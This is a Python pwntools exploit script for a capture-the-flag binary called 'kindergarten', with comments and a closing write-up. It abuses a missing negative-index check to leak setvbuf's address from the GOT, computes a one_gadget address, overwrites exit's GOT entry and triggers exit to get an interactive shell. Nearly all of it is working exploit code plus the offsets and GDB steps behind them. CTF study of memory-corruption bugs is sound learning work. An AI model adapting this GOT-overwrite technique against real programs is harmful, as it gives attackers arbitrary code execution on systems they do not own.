#!/usr/bin/env python
from pwn import *
import re
context(arch='amd64', os='linux')

# Notes:
# - Application behaviour: 
#	- It ask for index and read the value from that index of array, also allow to set the value on specific index.
#	- It implements +ve validation such as if we give index highr then 31 it will not working, But does not implement -ve value validation.
#	- For ex. if we provide -1 or any -value it accepts and fetch the value from that also allow to set new value over there.
#	- Also if we provide alphabet character as value application exit.
# - Logic :
#	- Get the address of function (E.g: setvbuf) by memory leakage, calculate the offset for "one_gadget" instruction.
#	- Overwrite the Got entry for exit function with one_gadget instruction address (arbitory memory write vuln)
#	- Call the exit function.
# - Exploit:
# 	- By observing the code we can say that binary uses "array" which is declared globally at address (0000000000004080)
#	- Global variable will be stored in ".bss" saction which has higher offset value then "GOT" saction (where function offset will there)
#	- Leak the value of "GOT function" E.g: setvbuf at address 0000000000004020.
#	- Diff is -60 (0000000000004080 - 0000000000004020).
#	- So, get next 8 byte value (-60,-59,-58,-57,-56,-55,-54,-53). which will leak the actuall address of "setvbuf" at runtime.
#	- calculate the one_gadget offset value from setvbuf function's address(Details description at last)
#	- Calculate the one_gadget actual address (add of setvbuf - one_gadget offset)
#	- Overwrite the Got entry for exit function with one_gadget instruction actual address. (address of exit at GOT 0000000000004030)
#	- Pass the alphabet character as input value, application will call exit function and you will get a shell. :D

def main():
    libc = ELF('./libc-2.23.so')
    setvbuf_off = libc.sym['setvbuf']

    one_gadget_off = 0x2d8fe #0x4526a (Read the description later in the exploit)
    
    #r = remote('127.0.0.1', 2323)
    r = process('./kindergarten')
    print util.proc.pidof(r)							# Print PID so we can attach the debugger.
    sys.stdin.read(1)	

    setvbuf = read64(r, -0x60)
    print "Address of setvbuf : ", hex(setvbuf)

    #libc_base = setvbuf - setvbuf_off
    #one_gadget = libc_base + one_gadget_off

    one_gadget = setvbuf - one_gadget_off
    print "Address of one_gadget : " , hex(one_gadget)

    # overwrite the GOT entry of exit function with one_gadgets address
    write(r, -0x50, p64(one_gadget))
    r.sendline('A')
    r.clean()
    r.interactive() 
    
    
# will retrive the address of setvbuf runtime
def read64(r, offset):
	buf = ''
	value = re.compile(r'the value at -?\d+ is (-?\d+)\. give me a new value:\n')
	for i in xrange(8):
		r.sendlineafter('give me an index:\n> ', str(offset + i))
		match = value.match(r.recvline())
		byte = int(match.group(1))
		r.sendline(str(byte))
		buf += p8(byte, signed=True)
	return u64(buf)
    
def write(r, offset, data):
    for i in xrange(len(data)):
        r.sendlineafter('give me an index:\n> ', str(offset + i))
        r.recvline()
        byte = u8(data[i], signed=True)
        r.sendline(str(byte))
 
if __name__ == '__main__':
    main()


'''
Problem description:
---------------------

Hi There,

I got the workaround solution and also successfully able to execute the "one_gadgets".
I have used the below approach:

I have used one_gadgets tool which give me 4 result out which I used 2nd one (with offset 0x4526a), But the complexity for me is either the libc base address was wrong or "one_gadgets"'s offset may be wrong.

So, I have used manual approach.
Step 1: $ objdump -D libc-2.23.so | grep 4526a
Step 2: Identify the from where the one_gadgets instruction belongs. (__strtold_nan)
Step 3: In GDB find the difference between p setvbuf - __strtold_nan .
Step 4: Try to find the instruction of one_gadgets (gdb-peda$ x/i <address of __strtold_nan) , but unfortunately the instruction belongs to other function which does not match with the step 2.
Step 5: Keep going with the next instruction by pressing enter,(I means next instruction)

For ex.: the one gadgets instructions belongs to "__strtold_nan" function.

So manually check the one_gadgets address in GDB using: x/i add-of __strtold_nan and press "Enter" key.

After pressing few "Enter" key the "__strtold_nan" function's instructions completed but did not get the "one_gadgets" instruction, so after few more attempt, I found that the actual instruction of "one_gadget" in GDB will point in "do_system" function. (in my case one_gadgets instruction from 0x7f64271c04b2 to 0x7f64271c04dc where the address of "__strtold_nan" function is 0x7f64271bff70, the address of "do_system" is 0x7f64271c0040 and the address of setvbuf is 0x7f64271eddb0)

So, this way I calculate the offset (from setvbuf to one_gadgets) manually and not needed the libc base-address.

Ex.: one_gadgets offset = (add of setvbuf - add of one_gadget)

so, one_gadgets offset = 0x7f64271eddb0 - 0x7f64271c04b2 (ans = 0x2d8fe)

Then, I used this offset in exploit and its working like charm.

I have exploited the binary in my local machine and not in the CTF itself, Let me know if i have done anything wrong or approach is wrong.

'''

